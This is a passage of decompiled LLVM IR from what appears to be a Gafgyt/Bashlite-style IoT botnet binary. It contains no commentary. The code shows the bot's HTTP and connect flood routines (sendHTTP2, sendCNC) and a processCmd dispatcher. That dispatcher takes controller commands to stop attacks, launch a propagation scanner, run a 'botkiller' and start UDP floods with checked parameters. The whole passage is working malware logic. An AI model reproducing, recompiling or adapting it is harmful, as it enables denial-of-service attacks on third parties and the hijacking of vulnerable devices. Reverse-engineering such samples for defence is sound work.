  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_10484, { 1, 0, 2 }
}

define i32 @sendHTTP2(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-573 = alloca i32, align 4
  %stack_var_-572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_104d8 = load i32, i32* @fp, align 4
  store i32 %v3_104d8, i32* %stack_var_-16, align 4
  store i32 66784, i32* %stack_var_-4, align 4
  %v2_104dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_104dc, i32* @fp, align 4
  %v2_1051c = call i32 @__GI_time(i32* null)
  %v3_10524 = load i32, i32* %stack_var_0, align 4
  %v2_10528 = add i32 %v3_10524, %v2_1051c
  %v2_10574 = ptrtoint i32* %stack_var_-572 to i32
  %tmp31 = bitcast i32* %stack_var_-572 to i8*
  %v2_10600 = ptrtoint i32* %stack_var_-573 to i32
  %v5_1065438 = icmp sgt i32 %arg6, 0
  br i1 %v5_1065438, label %dec_label_pc_10544.lr.ph, label %dec_label_pc_10658

dec_label_pc_10544.lr.ph:                         ; preds = %entry
  %v13_104d8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10568 = add i32 %v13_104d8, -44
  br label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %dec_label_pc_10544.lr.ph, %dec_label_pc_1063c
  %storemerge139 = phi i32 [ 0, %dec_label_pc_10544.lr.ph ], [ %v1_10640, %dec_label_pc_1063c ]
  %v0_10544 = call i32 @random()
  %v2_10554 = srem i32 %v0_10544, 36
  %v3_10560 = mul nsw i32 %v2_10554, 4
  %v2_1056c = add i32 %v2_10568, %v3_10560
  %v1_10570 = inttoptr i32 %v2_1056c to i32*
  %v2_10570 = load i32, i32* %v1_10570, align 4
  store i32 %v2_10574, i32* @r0, align 4
  %v7_10594 = call i32 @sprintf(i32 %v2_10574, i32 ptrtoint ([64 x i8]* @global_var_1c8dc.720 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_10570)
  %v0_10598 = call i32 @__libc_fork()
  %v2_105a0 = icmp eq i32 %v0_10598, 0
  br i1 %v2_105a0, label %dec_label_pc_1063c, label %dec_label_pc_1061c

dec_label_pc_105ac:                               ; preds = %dec_label_pc_1061c
  %v5_105c4 = call i32 @socket_connect(i32 %arg2, i8 %arg3, i32 %tmp)
  %v2_105d4 = icmp eq i32 %v5_105c4, 0
  br i1 %v2_105d4, label %dec_label_pc_1061c, label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105ac
  %v3_105e4 = call i32 @strlen(i8* %tmp31)
  store i32 %v3_105e4, i32* @r2, align 4
  %v3_105f8 = call i32 @__libc_write(i32 %v5_105c4, i32* nonnull %stack_var_-572)
  store i32 %v2_10600, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10610 = call i32 @__libc_read(i32 %v5_105c4)
  %v1_10618 = call i32 @__libc_close(i32 %v5_105c4)
  br label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %dec_label_pc_105ac, %dec_label_pc_105dc, %dec_label_pc_10544
  %v2_10620 = call i32 @__GI_time(i32* null)
  %v5_10630 = icmp slt i32 %v2_10620, %v2_10528
  br i1 %v5_10630, label %dec_label_pc_105ac, label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_1061c
  %v1_10638 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10544, %dec_label_pc_10634
  %v9_1065c4 = phi i32 [ 0, %dec_label_pc_10544 ], [ %v1_10638, %dec_label_pc_10634 ]
  %v1_10640 = add nuw nsw i32 %storemerge139, 1
  %v5_10654 = icmp slt i32 %v1_10640, %arg6
  br i1 %v5_10654, label %dec_label_pc_10544, label %dec_label_pc_10658

dec_label_pc_10658:                               ; preds = %dec_label_pc_1063c, %entry
  %v9_1065c.lcssa = phi i32 [ %v2_1051c, %entry ], [ %v9_1065c4, %dec_label_pc_1063c ]
  %v2_1065c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1065c, i32* @fp, align 4
  ret i32 %v9_1065c.lcssa

; uselistorder directives
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
  uselistorder label %dec_label_pc_1061c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10544, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10688 = call i32 @__GI_time(i32* null)
  %v2_10694 = add i32 %v2_10688, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_106a4 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_106c8 = urem i32 %arg2, 65536
  %v1_106d0 = call i32 @htons(i32 %v3_106c8)
  %v3_10710 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_10724

dec_label_pc_106e8:                               ; preds = %dec_label_pc_10724
  %v0_106f4 = call i32 @socket()
  %v4_10710 = call i32 @__libc_connect(i32 %v0_106f4, %sockaddr* %v3_10710, i32 16)
  %v1_10718 = call i32 @sleep(i32 1)
  %v1_10720 = call i32 @__libc_close(i32 %v0_106f4)
  br label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %entry, %dec_label_pc_106e8
  %v2_10728 = call i32 @__GI_time(i32* null)
  %v5_10738 = icmp slt i32 %v2_10728, %v2_10694
  br i1 %v5_10738, label %dec_label_pc_106e8, label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_10724
  ret i32 %v2_10728

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10724, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10744 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10744, i32* @ip, align 4
  %v3_10748 = load i32, i32* @r4, align 4
  %v6_10748 = load i32, i32* @r5, align 4
  %v9_10748 = load i32, i32* @r6, align 4
  %v12_10748 = load i32, i32* @r7, align 4
  %v15_10748 = load i32, i32* @r8, align 4
  %v18_10748 = load i32, i32* @fp, align 4
  store i32 67408, i32* %stack_var_-4, align 4
  %v2_1074c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1074c, i32* @fp, align 4
  %v2_10760 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b718.56 to i32), i32* @r1, align 4
  %v3_1076c = inttoptr i32 %v2_10760 to i8*
  %v4_1076c = call i32 @__GI_strcoll(i8* %v3_1076c, i32 ptrtoint ([5 x i8]* @global_var_1b718.56 to i32))
  %v2_10774 = icmp eq i32 %v4_1076c, 0
  br i1 %v2_10774, label %dec_label_pc_1077c, label %dec_label_pc_10794

dec_label_pc_1077c:                               ; preds = %entry
  %v2_10780 = load i32, i32* @global_var_26864.54, align 4
  %v3_1078c = call i32 @sockprintf(i32 %v2_10780, i32 ptrtoint ([6 x i8]* @global_var_1c91c.724 to i32))
  br label %dec_label_pc_11858

dec_label_pc_10794:                               ; preds = %entry
  %v2_10798 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1c924.726 to i32), i32* @r1, align 4
  %v3_107a4 = inttoptr i32 %v2_10798 to i8*
  %v4_107a4 = call i32 @__GI_strcoll(i8* %v3_107a4, i32 ptrtoint ([6 x i8]* @global_var_1c924.726 to i32))
  %v2_107ac = icmp eq i32 %v4_107a4, 0
  br i1 %v2_107ac, label %dec_label_pc_107b4, label %dec_label_pc_107d8

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10794
  %v2_107b8 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_107b8, i32* @r4, align 4
  %v0_107bc = call i32 @getdtablesize()
  %v0_107c4 = load i32, i32* @r4, align 4
  store i32 %v0_107bc, i32* @r2, align 4
  %v3_107d0 = call i32 @sockprintf(i32 %v0_107c4, i32 ptrtoint ([3 x i8]* @global_var_1c92c.728 to i32))
  br label %dec_label_pc_11858

dec_label_pc_107d8:                               ; preds = %dec_label_pc_10794
  %v2_107dc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c930.730 to i32), i32* @r1, align 4
  %v3_107e8 = inttoptr i32 %v2_107dc to i8*
  %v4_107e8 = call i32 @__GI_strcoll(i8* %v3_107e8, i32 ptrtoint ([8 x i8]* @global_var_1c930.730 to i32))
  %v2_107f0 = icmp eq i32 %v4_107e8, 0
  br i1 %v2_107f0, label %dec_label_pc_107f8, label %dec_label_pc_10914

dec_label_pc_107f8:                               ; preds = %dec_label_pc_107d8
  %v1_107fc = add i32 %tmp, 4
  %v1_10800 = inttoptr i32 %v1_107fc to i32*
  %v2_10800 = load i32, i32* %v1_10800, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c938.732 to i32), i32* @r1, align 4
  %v3_1080c = inttoptr i32 %v2_10800 to i8*
  %v4_1080c = call i32 @__GI_strcoll(i8* %v3_1080c, i32 ptrtoint ([4 x i8]* @global_var_1c938.732 to i32))
  %v2_10814 = icmp eq i32 %v4_1080c, 0
  br i1 %v2_10814, label %dec_label_pc_1081c, label %dec_label_pc_10860

dec_label_pc_1081c:                               ; preds = %dec_label_pc_107f8
  %v2_10820 = load i32, i32* @global_var_2cae8.734, align 4
  %v2_10824 = icmp eq i32 %v2_10820, 0
  br i1 %v2_10824, label %dec_label_pc_11858, label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %dec_label_pc_1081c
  %v0_1083c = call i32 @kill()
  %v2_10844 = load i32, i32* @global_var_26864.54, align 4
  %v3_10850 = call i32 @sockprintf(i32 %v2_10844, i32 ptrtoint ([17 x i8]* @global_var_1c93c.736 to i32))
  store i32 0, i32* @global_var_2cae8.734, align 4
  br label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_107f8, %dec_label_pc_1082c
  %v2_10868 = load i32, i32* %v1_10800, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1c950.738 to i32), i32* @r1, align 4
  %v3_10874 = inttoptr i32 %v2_10868 to i8*
  %v4_10874 = call i32 @__GI_strcoll(i8* %v3_10874, i32 ptrtoint ([3 x i8]* @global_var_1c950.738 to i32))
  %v2_1087c = icmp eq i32 %v4_10874, 0
  br i1 %v2_1087c, label %dec_label_pc_10884, label %dec_label_pc_10914

dec_label_pc_10884:                               ; preds = %dec_label_pc_10860
  %v2_10888 = load i32, i32* @global_var_2cae8.734, align 4
  %v2_1088c = icmp eq i32 %v2_10888, 0
  br i1 %v2_1088c, label %dec_label_pc_10894, label %dec_label_pc_11858

dec_label_pc_10894:                               ; preds = %dec_label_pc_10884
  %v0_10894 = call i32 @__libc_fork()
  %v2_108b4 = icmp eq i32 %v0_10894, 0
  br i1 %v2_108b4, label %dec_label_pc_108d8, label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %dec_label_pc_10894
  store i32 %v0_10894, i32* @global_var_2cae8.734, align 4
  br label %dec_label_pc_11858

dec_label_pc_108d8:                               ; preds = %dec_label_pc_10894
  %v2_108dc = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_108dc, i32* @r4, align 4
  %v2_108e4 = load i32, i32* @global_var_2cae0.485, align 4
  store i32 %v2_108e4, i32* @r0, align 4
  %v1_108e8 = call i32 @__GI_inet_ntoa(i32 %v2_108e4)
  %v0_108f0 = load i32, i32* @r4, align 4
  store i32 %v1_108e8, i32* @r2, align 4
  %v3_108fc = call i32 @sockprintf(i32 %v0_108f0, i32 ptrtoint ([26 x i8]* @global_var_1c954.741 to i32))
  %v2_10908 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_10910 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10914:                               ; preds = %dec_label_pc_10860, %dec_label_pc_107d8
  %v2_10918 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c970.743 to i32), i32* @r1, align 4
  %v3_10924 = inttoptr i32 %v2_10918 to i8*
  %v4_10924 = call i32 @__GI_strcoll(i8* %v3_10924, i32 ptrtoint ([8 x i8]* @global_var_1c970.743 to i32))
  %v2_1092c = icmp eq i32 %v4_10924, 0
  br i1 %v2_1092c, label %dec_label_pc_10934, label %dec_label_pc_10978

dec_label_pc_10934:                               ; preds = %dec_label_pc_10914
  %v0_10934 = call i32 @listFork()
  %v2_1093c = icmp eq i32 %v0_10934, 0
  br i1 %v2_1093c, label %dec_label_pc_10944, label %dec_label_pc_10978

dec_label_pc_10944:                               ; preds = %dec_label_pc_10934
  %v2_10948 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_10948, i32* @r4, align 4
  %v2_10950 = load i32, i32* @global_var_2cae0.485, align 4
  store i32 %v2_10950, i32* @r0, align 4
  %v1_10954 = call i32 @__GI_inet_ntoa(i32 %v2_10950)
  %v0_1095c = load i32, i32* @r4, align 4
  store i32 %v1_10954, i32* @r2, align 4
  %v3_10968 = call i32 @sockprintf(i32 %v0_1095c, i32 ptrtoint ([29 x i8]* @global_var_1c978.745 to i32))
  %v1_1096c = call i32 @botkiller(i32 %v3_10968)
  %v1_10974 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10978:                               ; preds = %dec_label_pc_10934, %dec_label_pc_10914
  %v2_1097c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1c998.747 to i32), i32* @r1, align 4
  %v3_10988 = inttoptr i32 %v2_1097c to i8*
  %v4_10988 = call i32 @__GI_strcoll(i8* %v3_10988, i32 ptrtoint ([12 x i8]* @global_var_1c998.747 to i32))
  %v2_10990 = icmp eq i32 %v4_10988, 0
  br i1 %v2_10990, label %dec_label_pc_10998, label %dec_label_pc_109c4

dec_label_pc_10998:                               ; preds = %dec_label_pc_10978
  %v2_1099c = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_1099c, i32* @r4, align 4
  %v2_109a4 = load i32, i32* @global_var_2cae0.485, align 4
  store i32 %v2_109a4, i32* @r0, align 4
  %v1_109a8 = call i32 @__GI_inet_ntoa(i32 %v2_109a4)
  %v0_109b0 = load i32, i32* @r4, align 4
  store i32 %v1_109a8, i32* @r2, align 4
  %v3_109bc = call i32 @sockprintf(i32 %v0_109b0, i32 ptrtoint ([17 x i8]* @global_var_1c9a4.749 to i32))
  br label %dec_label_pc_11858

dec_label_pc_109c4:                               ; preds = %dec_label_pc_10978
  %v2_109c8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c9b8.751 to i32), i32* @r1, align 4
  %v3_109d4 = inttoptr i32 %v2_109c8 to i8*
  %v4_109d4 = call i32 @__GI_strcoll(i8* %v3_109d4, i32 ptrtoint ([4 x i8]* @global_var_1c9b8.751 to i32))
  %v2_109dc = icmp eq i32 %v4_109d4, 0
  br i1 %v2_109dc, label %dec_label_pc_109e4, label %dec_label_pc_10d44

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109c4
  %v7_109ec = icmp slt i32 %arg1, 6
  br i1 %v7_109ec, label %dec_label_pc_10b04, label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109e4
  %v1_109f4 = add i32 %tmp, 12
  %v1_109f8 = inttoptr i32 %v1_109f4 to i32*
  %v2_109f8 = load i32, i32* %v1_109f8, align 4
  store i32 %v2_109f8, i32* @r0, align 4
  %v1_10a00 = call i32 @atol(i32 %v2_109f8)
  %v7_10a08 = icmp eq i32 %v1_10a00, -1
  br i1 %v7_10a08, label %dec_label_pc_10b04, label %dec_label_pc_10a10

dec_label_pc_10a10:                               ; preds = %dec_label_pc_109f0
  %v1_10a14 = add i32 %tmp, 8
  %v1_10a18 = inttoptr i32 %v1_10a14 to i32*
  %v2_10a18 = load i32, i32* %v1_10a18, align 4
  store i32 %v2_10a18, i32* @r0, align 4
  %v1_10a20 = call i32 @atol(i32 %v2_10a18)
  %v7_10a28 = icmp eq i32 %v1_10a20, -1
  br i1 %v7_10a28, label %dec_label_pc_10b04, label %dec_label_pc_10a30

dec_label_pc_10a30:                               ; preds = %dec_label_pc_10a10
  %v1_10a34 = add i32 %tmp, 16
  %v1_10a38 = inttoptr i32 %v1_10a34 to i32*
  %v2_10a38 = load i32, i32* %v1_10a38, align 4
  store i32 %v2_10a38, i32* @r0, align 4
  %v1_10a40 = call i32 @atol(i32 %v2_10a38)
  %v7_10a48 = icmp eq i32 %v1_10a40, -1
  br i1 %v7_10a48, label %dec_label_pc_10b04, label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a30
  %v1_10a54 = add i32 %tmp, 20
  %v1_10a58 = inttoptr i32 %v1_10a54 to i32*
  %v2_10a58 = load i32, i32* %v1_10a58, align 4
  store i32 %v2_10a58, i32* @r0, align 4
  %v1_10a60 = call i32 @atol(i32 %v2_10a58)
  %v7_10a68 = icmp eq i32 %v1_10a60, -1
  br i1 %v7_10a68, label %dec_label_pc_10b04, label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a50
  %v2_10a78 = load i32, i32* %v1_10a58, align 4
  store i32 %v2_10a78, i32* @r0, align 4
  %v1_10a80 = call i32 @atol(i32 %v2_10a78)
  %v8_10a8c = icmp sgt i32 %v1_10a80, 65536
  br i1 %v8_10a8c, label %dec_label_pc_10b04, label %dec_label_pc_10a90

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a70
  %v2_10a98 = load i32, i32* %v1_10a58, align 4
  store i32 %v2_10a98, i32* @r0, align 4
  %v1_10aa0 = call i32 @atol(i32 %v2_10a98)
  store i32 %v1_10aa0, i32* @r2, align 4
  %v8_10ab4 = icmp sgt i32 %v1_10aa0, 65500
  br i1 %v8_10ab4, label %dec_label_pc_10b04, label %dec_label_pc_10ab8

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_10a90
  %v2_10ac0 = load i32, i32* %v1_10a38, align 4
  store i32 %v2_10ac0, i32* @r0, align 4
  %v1_10ac8 = call i32 @atol(i32 %v2_10ac0)
  %v8_10ad4 = icmp sgt i32 %v1_10ac8, 32
  br i1 %v8_10ad4, label %dec_label_pc_10b04, label %dec_label_pc_10ad8

dec_label_pc_10ad8:                               ; preds = %dec_label_pc_10ab8
  %v7_10adc = icmp eq i32 %arg1, 7
  br i1 %v7_10adc, label %dec_label_pc_10ae4, label %dec_label_pc_10b1c

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ad8
  %v1_10ae8 = add i32 %tmp, 24
  %v1_10aec = inttoptr i32 %v1_10ae8 to i32*
  %v2_10aec = load i32, i32* %v1_10aec, align 4
  store i32 %v2_10aec, i32* @r0, align 4
  %v1_10af4 = call i32 @atol(i32 %v2_10aec)
  %v5_10b00 = icmp sgt i32 %v1_10af4, 0
  br i1 %v5_10b00, label %dec_label_pc_10b1c, label %dec_label_pc_10b04

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10ab8, %dec_label_pc_10a90, %dec_label_pc_10a70, %dec_label_pc_10a50, %dec_label_pc_10a30, %dec_label_pc_10a10, %dec_label_pc_109f0, %dec_label_pc_109e4
  %v2_10b08 = load i32, i32* @global_var_26864.54, align 4
  %v3_10b14 = call i32 @sockprintf(i32 %v2_10b08, i32 ptrtoint ([113 x i8]* @global_var_1c9bc.753 to i32))
  br label %dec_label_pc_11858

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10ad8, %dec_label_pc_10ae4
  %v1_10b20 = add i32 %tmp, 4
  %v1_10b24 = inttoptr i32 %v1_10b20 to i32*
  %v2_10b24 = load i32, i32* %v1_10b24, align 4
  %v2_10b34 = load i32, i32* %v1_10a18, align 4
  store i32 %v2_10b34, i32* @r0, align 4
  %v1_10b3c = call i32 @atol(i32 %v2_10b34)
  %v2_10b50 = load i32, i32* %v1_109f8, align 4
  store i32 %v2_10b50, i32* @r0, align 4
  %v1_10b58 = call i32 @atol(i32 %v2_10b50)
  %v2_10b6c = load i32, i32* %v1_10a38, align 4
  store i32 %v2_10b6c, i32* @r0, align 4
  %v1_10b74 = call i32 @atol(i32 %v2_10b6c)
  %v2_10b88 = load i32, i32* %v1_10a58, align 4
  store i32 %v2_10b88, i32* @r0, align 4
  %v1_10b90 = call i32 @atol(i32 %v2_10b88)
  %v7_10ba4 = icmp slt i32 %arg1, 7
  br i1 %v7_10ba4, label %dec_label_pc_10bc4, label %dec_label_pc_10ba8

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b1c
  %v1_10bac = add i32 %tmp, 24
  %v1_10bb0 = inttoptr i32 %v1_10bac to i32*
  %v2_10bb0 = load i32, i32* %v1_10bb0, align 4
  store i32 %v2_10bb0, i32* @r0, align 4
  %v1_10bb8 = call i32 @atol(i32 %v2_10bb0)
  br label %dec_label_pc_10bcc

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10b1c
  br label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10ba8, %dec_label_pc_10bc4
  %storemerge10 = phi i32 [ 1000, %dec_label_pc_10bc4 ], [ %v1_10bb8, %dec_label_pc_10ba8 ]
  %v7_10bdc = icmp slt i32 %arg1, 8
  br i1 %v7_10bdc, label %dec_label_pc_10bfc, label %dec_label_pc_10be0

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bcc
  %v1_10be4 = add i32 %tmp, 28
  %v1_10be8 = inttoptr i32 %v1_10be4 to i32*
  %v2_10be8 = load i32, i32* %v1_10be8, align 4
  store i32 %v2_10be8, i32* @r0, align 4
  %v1_10bf0 = call i32 @atol(i32 %v2_10be8)
  br label %dec_label_pc_10c10

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bcc
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10be0, %dec_label_pc_10bfc
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_10bfc ], [ %v1_10bf0, %dec_label_pc_10be0 ]
  %v7_10c20 = icmp slt i32 %arg1, 9
  br i1 %v7_10c20, label %dec_label_pc_10c40, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c10
  %v1_10c28 = add i32 %tmp, 32
  %v1_10c2c = inttoptr i32 %v1_10c28 to i32*
  %v2_10c2c = load i32, i32* %v1_10c2c, align 4
  store i32 %v2_10c2c, i32* @r0, align 4
  %v1_10c34 = call i32 @atol(i32 %v2_10c2c)
  br label %dec_label_pc_10c48

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c10
  br label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c24, %dec_label_pc_10c40
  %storemerge8 = phi i32 [ 0, %dec_label_pc_10c40 ], [ %v1_10c34, %dec_label_pc_10c24 ]
  %v2_10c5c = call i32 @__GI_strchr(i32 %v2_10b24, i32 44)
  %v2_10c64 = icmp eq i32 %v2_10c5c, 0
  br i1 %v2_10c64, label %dec_label_pc_10cf8, label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c48
  store i32 %v2_10b24, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_10c78 = call i32 @__GI_strtok(i32 %v2_10b24, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_10cec27 = icmp eq i32 %v2_10c78, 0
  br i1 %v2_10cec27, label %dec_label_pc_11858, label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10c6c, %dec_label_pc_10cd4
  %storemerge2128 = phi i32 [ %v2_10cdc, %dec_label_pc_10cd4 ], [ %v2_10c78, %dec_label_pc_10c6c ]
  %v0_10c88 = call i32 @listFork()
  %v2_10c90 = icmp eq i32 %v0_10c88, 0
  br i1 %v2_10c90, label %dec_label_pc_10c98, label %dec_label_pc_10cd4

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c88
  %v8_10cc8 = call i32 @sendUDP(i32 %storemerge2128, i32 %v1_10b3c, i32 %v1_10b58, i32 %v1_10b74, i32 %v1_10b90, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_10cd0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10c88
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_10cdc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_10cec = icmp eq i32 %v2_10cdc, 0
  br i1 %v2_10cec, label %dec_label_pc_11858, label %dec_label_pc_10c88

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10c48
  %v0_10cf8 = call i32 @listFork()
  %v2_10d00 = icmp eq i32 %v0_10cf8, 0
  br i1 %v2_10d00, label %dec_label_pc_10d08, label %dec_label_pc_11858

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10cf8
  %v8_10d38 = call i32 @sendUDP(i32 %v2_10b24, i32 %v1_10b3c, i32 %v1_10b58, i32 %v1_10b74, i32 %v1_10b90, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_10d40 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10d44:                               ; preds = %dec_label_pc_109c4
  %v2_10d48 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ca30.756 to i32), i32* @r1, align 4
  %v3_10d54 = inttoptr i32 %v2_10d48 to i8*
  %v4_10d54 = call i32 @__GI_strcoll(i8* %v3_10d54, i32 ptrtoint ([4 x i8]* @global_var_1ca30.756 to i32))
  %v2_10d5c = icmp eq i32 %v4_10d54, 0
  br i1 %v2_10d5c, label %dec_label_pc_10d64, label %dec_label_pc_11028

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d44
  %v7_10d6c = icmp slt i32 %arg1, 6
  br i1 %v7_10d6c, label %dec_label_pc_10e48, label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10d64
  %v1_10d74 = add i32 %tmp, 12
  %v1_10d78 = inttoptr i32 %v1_10d74 to i32*
  %v2_10d78 = load i32, i32* %v1_10d78, align 4
  store i32 %v2_10d78, i32* @r0, align 4
  %v1_10d80 = call i32 @atol(i32 %v2_10d78)
  %v7_10d88 = icmp eq i32 %v1_10d80, -1
  br i1 %v7_10d88, label %dec_label_pc_10e48, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d70
  %v1_10d94 = add i32 %tmp, 8
  %v1_10d98 = inttoptr i32 %v1_10d94 to i32*
  %v2_10d98 = load i32, i32* %v1_10d98, align 4
  store i32 %v2_10d98, i32* @r0, align 4
  %v1_10da0 = call i32 @atol(i32 %v2_10d98)
  %v7_10da8 = icmp eq i32 %v1_10da0, -1
  br i1 %v7_10da8, label %dec_label_pc_10e48, label %dec_label_pc_10db0

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10d90
  %v1_10db4 = add i32 %tmp, 16
  %v1_10db8 = inttoptr i32 %v1_10db4 to i32*
  %v2_10db8 = load i32, i32* %v1_10db8, align 4
  store i32 %v2_10db8, i32* @r0, align 4
  %v1_10dc0 = call i32 @atol(i32 %v2_10db8)
  %v7_10dc8 = icmp eq i32 %v1_10dc0, -1
  br i1 %v7_10dc8, label %dec_label_pc_10e48, label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10db0
  %v2_10dd8 = load i32, i32* %v1_10db8, align 4
  store i32 %v2_10dd8, i32* @r0, align 4
  %v1_10de0 = call i32 @atol(i32 %v2_10dd8)
  %v8_10dec = icmp sgt i32 %v1_10de0, 32
  br i1 %v8_10dec, label %dec_label_pc_10e48, label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10dd0
  %v7_10df8 = icmp slt i32 %arg1, 7
  br i1 %v7_10df8, label %dec_label_pc_10e1c, label %dec_label_pc_10dfc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10df0
  %v1_10e00 = add i32 %tmp, 24
  %v1_10e04 = inttoptr i32 %v1_10e00 to i32*
  %v2_10e04 = load i32, i32* %v1_10e04, align 4
  store i32 %v2_10e04, i32* @r0, align 4
  %v1_10e0c = call i32 @atol(i32 %v2_10e04)
  %v1_10e14 = icmp slt i32 %v1_10e0c, 0
  br i1 %v1_10e14, label %dec_label_pc_10e48, label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10dfc, %dec_label_pc_10df0
  %v7_10e20 = icmp eq i32 %arg1, 8
  br i1 %v7_10e20, label %dec_label_pc_10e28, label %dec_label_pc_10e60

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e1c
  %v1_10e2c = add i32 %tmp, 28
  %v1_10e30 = inttoptr i32 %v1_10e2c to i32*
  %v2_10e30 = load i32, i32* %v1_10e30, align 4
  store i32 %v2_10e30, i32* @r0, align 4
